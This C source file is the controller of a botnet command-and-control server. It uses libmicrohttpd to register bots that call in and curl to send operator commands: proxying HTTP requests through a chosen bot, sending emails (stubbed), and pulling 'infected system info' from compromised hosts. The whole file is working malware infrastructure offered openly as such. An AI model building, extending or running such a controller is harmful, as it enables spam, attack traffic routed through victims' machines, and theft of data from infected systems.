
#include "controller.h"
#define PAGE "<html><head><title>libmicrohttpd demo</title>" \
             "</head><body>libmicrohttpd demo</body></html>"

// BRAINSTORMING

/*
    p1 -> always on, get commands from cli and execute them
    p2 -> alway on, accept connections from bot in order to register themc -> P2_CONN TCP

    p1 and p2 need to access a shared resource (active_bots):
    - p2 write on in -> producer
    - p1 read from it and update its contents -> consumer

    should I create a c1 process (child of p1)  or a p3 process
    that leaves a open UDP connection in order
    to update bots active state?

    active_bots -> Critical section
    botExists, list_botnet , sendCommand -> unsafe for now
*/

// BOT -> Critical section

active_bots *botnet;
struct MHD_Daemon *mhd_daemon;

// ! ########################################################### MAIN ######################################################################################
int main(int argc, char const *argv[])
{

    int pid;

    initializeSemaphores();

    botnet = (active_bots *)malloc(sizeof(active_bots));
    if (botnet == NULL)
    {
        handle_error("Botnet could not be initialized");
    }
    botnet->next = NULL;
    botnet->bot_id = 0;

    pthread_t *threads = (pthread_t *)malloc(2 * sizeof(pthread_t));

    // parent
    if (pthread_create(&threads[0], NULL, parent, NULL) != 0)
    {
        fprintf(stderr, "Can't create a new thread, error %d\n", errno);
        exit(EXIT_FAILURE);
    }
    // child
    if (pthread_create(&threads[1], NULL, child, NULL) != 0)
    {
        fprintf(stderr, "Can't create a new thread, error %d\n", errno);
        exit(EXIT_FAILURE);
    }

    for (int i = 0; i < 2; i++)
    {
        pthread_join(threads[i], NULL);
    }

    return 0;
}
// ! ########################################################### PARENT ######################################################################################
void parent(/*int pid*/)
{

    while (1)
    {

        char command[10];
        printf("\nInsert Command : ");
        fgets(command, 10, stdin);

        if (strcmp(command, LIST) == 0)
        {
            printf("Listing active bots of current botnet \n");

            list_botnet(1);
        }
        else if (strcmp(command, QUIT) == 0)
        {
            printf("Stop C&C \n");
            free(botnet);

            ret = closeSemaphores();
            if (ret < 0)
            {
                handle_error("Failed to close semaphores");
            }

            MHD_stop_daemon(mhd_daemon);

            // kill(pid, SIGKILL);

            exit(EXIT_SUCCESS);
        }
        else if (strcmp(command, "\n") == 0)
        {
        }
        // maybe just one or multiple | statements

        else if (strcmp(command, HTTP_REQ) == 0 | strcmp(command, EMAIL) == 0 | strcmp(command, SYS_INFO) == 0)
        {
            printf("Choose bot to which send command \n");

            ret = list_botnet(0);

            if (ret < 0)
                continue;

            char bot_id[100];
            fgets(bot_id, 100, stdin);
            int bot = atoi(bot_id);

            if (botExists(bot) < 0)
            {
                printf("Not a valid bot id \n");
                continue;
            }
            else
            {
                sendCommand(command, bot);
            }
        }
        else
        {
            printf("Error, command not supported choose one from the following available commands: \n %s \n %s \n %s \n %s \n %s \n ",
                   HTTP_REQ, LIST, EMAIL, SYS_INFO, QUIT);

            continue;
        }
    }
}
// ! ########################################################### CHILD ######################################################################################
void child()
{

    const union MHD_ConnectionInfo *conninfo;

    mhd_daemon = MHD_start_daemon(MHD_USE_SELECT_INTERNALLY, 8081, NULL, NULL, &handle_request, NULL, MHD_OPTION_END);
    if (mhd_daemon == NULL)
    {
        fprintf(stderr, "Error starting daemon.\n");
        _exit(EXIT_FAILURE);
    }

    fprintf(stdout, "Child process started. Listening on port %d.\n", 8081);
    while (1)
    {
        sleep(1);
    }
}

void sendCommand(char *command, int bot_id)
{

    CURL *curl;

    curl = curl_easy_init();

    if (curl == NULL)
        handle_error("Could not execute command, error initializing curl handle");
    else
    {

        CURLcode res;

        char url[255] = {0};

        char bot_ip[INET_ADDRSTRLEN] = {0};
        char target_ip[INET_ADDRSTRLEN] = {0};
        long bot_port;

        if (botExists(bot_id) < 0)
        {
            printf("Bot with id: %d does not exists\n", bot_id);
            return;
        }

        ret = setBotInfo(&bot_port, bot_ip, bot_id);
        if (ret < 0)
        {
            printf("Could not set bot info");
            return;
        }

        printf("Submit target's ip in dot decimal notation: \n");

        fgets(target_ip, sizeof(target_ip), stdin);

        target_ip[strcspn(target_ip, "\n")] = 0;

        updateBotInfo(bot_id, target_ip, command);

        // * BUILDING REQUEST
        // url = (char *)malloc(sizeof(PROTOCOL) + sizeof(bot_ip) + 1);

        strcpy(url, PROTOCOL);

        strcat(url, bot_ip);

        curl_easy_setopt(curl, CURLOPT_PORT, bot_port);

        //! for each command you need to update bot info about action and target
        if (strcmp(command, HTTP_REQ) == 0)
        {
            char request[MAX_REQ_SIZE];

            printf("Insert request to proxy : ");
            scanf("%s", request);
            char *new_url = (char *)malloc(sizeof(url) + sizeof(request) + sizeof(HTTP_REQ_ENDPOINT));
            memcpy(new_url, url, sizeof(url));
            strcat(new_url, HTTP_REQ_ENDPOINT);
            strcat(new_url, request);
            curl_easy_setopt(curl, CURLOPT_URL, new_url);

            printf("Sending request:  %s to bot...\n", new_url);
            free(new_url);
        }

        if (strcmp(command, EMAIL) == 0)
        {
            printf("Sending emails ");

            strcat(url, "/email");

            // TODO email batch
        }
        if (strcmp(command, SYS_INFO) == 0)
        {
            printf("Retrieving infected system info\n");

            strcat(url, "/sys_info");
            curl_easy_setopt(curl, CURLOPT_URL, url);
            curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
        }

        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
    }
}

int handle_request(void *cls, struct MHD_Connection *connection, const char *url,
                   const char *method, const char *version, const char *upload_data,
                   size_t *upload_data_size, void **con_cls)
{
    const char *msg = "OK";
    struct MHD_Response *response;
    int ret;

    response = MHD_create_response_from_buffer(strlen(msg), (void *)msg, MHD_RESPMEM_PERSISTENT);
    ret = MHD_queue_response(connection, MHD_HTTP_OK, response);

    const char *bot_ip = MHD_lookup_connection_value(connection, MHD_GET_ARGUMENT_KIND, C_IP);
    const char *bot_port = MHD_lookup_connection_value(connection, MHD_GET_ARGUMENT_KIND, C_PORT);

    long port = atol(bot_port);
    struct in_addr address;
    inet_pton(AF_INET, bot_ip, &(address));

    // TODO get updates from bots

    if (findBot(address, port) == -1)
    {

        ret = registerBot(bot_ip, bot_port);

        if (ret < 0)
        {
            const char *msg = "NOT OK";
        }
        printf("Bot Connected \n");
    }

    char *endpoint;
    endpoint = strstr(url, "/notify");
    if (endpoint != NULL)
    {

        printf("Botnet : \n");
        list_botnet(1);

        printf("Bot completed its task...\n");
        int ID = getBotID(bot_ip, bot_port);
        if (ID == -1)
        {
            printf("BOT %s:%s not present in botnet\n", bot_ip,bot_port);
        }else{

            updateBotInfo(ID,"","");
        }


        endpoint = NULL;
    }

    printf("Botnet updated: \n");
    list_botnet(1);

    MHD_destroy_response(response);

    return ret;
}